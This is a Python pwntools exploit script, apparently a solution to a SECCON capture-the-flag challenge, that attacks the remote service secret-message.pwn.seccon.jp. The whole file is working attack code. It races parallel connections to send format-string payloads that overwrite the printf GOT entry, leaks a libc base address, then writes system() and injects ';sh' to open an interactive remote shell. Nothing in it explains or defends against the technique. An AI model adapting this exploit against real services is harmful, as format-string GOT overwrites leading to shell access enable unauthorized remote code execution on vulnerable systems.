from pwn import *

#HOST='localhost'
#PORT=17778

HOST='secret-message.pwn.seccon.jp'
PORT=31337

while(1):
    try:
        r1=remote(HOST,PORT)
        r2=remote(HOST,PORT)


        show=0x00000000004020AC
        printf_got=0x000000000060A020
        filename='%{}c%48$hhn%{}c%60$n%{}c%75$n%2c%92$nhere%58$16llx'.format(0xb0-8,show-(0xb0-8),printf_got-show)
        print filename
        to_='a'*0x100
        from_='b'*0x100
        r2to='c'*100
        r2from='d'*100

        #bp 0x0000000000401419 set $rsi=0x0101010101010117
        from_=open('files/ex_helper1','rb').read()[0x10:-0x10]

        print len(from_)

        r1.sendline('e')
        r1.sendlineafter('to',to_)
        r1.sendlineafter('from',from_)
        r1.sendlineafter('filename',filename)


        r2.sendline('e')
        r2.sendlineafter('to',r2to)
        r2.sendlineafter('from',r2from)
        r2.sendlineafter('filename',filename)

        r1.sendlineafter('message length',str(8))
        r2.sendlineafter('message length',str(9))
        # r1.interactive()
        r1.sendafter('message','M'*6)
        sleep(0.5)
        r2.sendafter('message','M'*9)
        sleep(0.5)
        r2.close()
        r1.send('M'*2)
        sleep(0.5)
        r1.close()

        #bp 0x0000000000401419 set $rsi=0x0101010101011717
        from_=open('files/ex_helper2','rb').read()[0x10:-0x10]

        rs=remote(HOST,PORT)
        rs.sendline('s')
        rs.sendlineafter('path',filename)

        rs.recvuntil('here')
        # libc_base=int(rs.recv(16).replace(' ',''),16)-0x3eba00
        libc_base=int(rs.recv(16).replace(' ',''),16)-0x3c48e0

        print hex(libc_base)
        # system=libc_base+0x4f440
        system=libc_base+0x45390
        filename2='%{}c%88$hn'.format(system&0xffff)
        x=((system>>16)&0xffff)-(system&0xffff)
        if x<0:
            x+=0x10000
        filename2+='%{}c%87$hn'.format(x)
        filename2+=';sh'
        print filename2

        r3=remote(HOST,PORT)
        r4=remote(HOST,PORT)
        r3.sendline('e')
        r3.sendlineafter('to',to_)
        r3.sendlineafter('from',from_)
        r3.sendlineafter('filename',filename2)
        r4.sendline('e')
        r4.sendlineafter('to',r2to)
        r4.sendlineafter('from',r2from)
        r4.sendlineafter('filename',filename2)
        r3.sendlineafter('message length',str(8))
        r4.sendlineafter('message length',str(9))
        r3.sendafter('message','M'*6)
        sleep(0.3)
        r4.sendafter('message','M'*9)
        sleep(0.3)
        r4.close()
        r3.send('M'*2)
        sleep(0.2)
        r3.close()

        x=rs.recvuntil('path',timeout=1)
        if not x:
            rs.close()

        rs.sendline(filename2)
        rs.interactive()
    except:
        # break
        continue
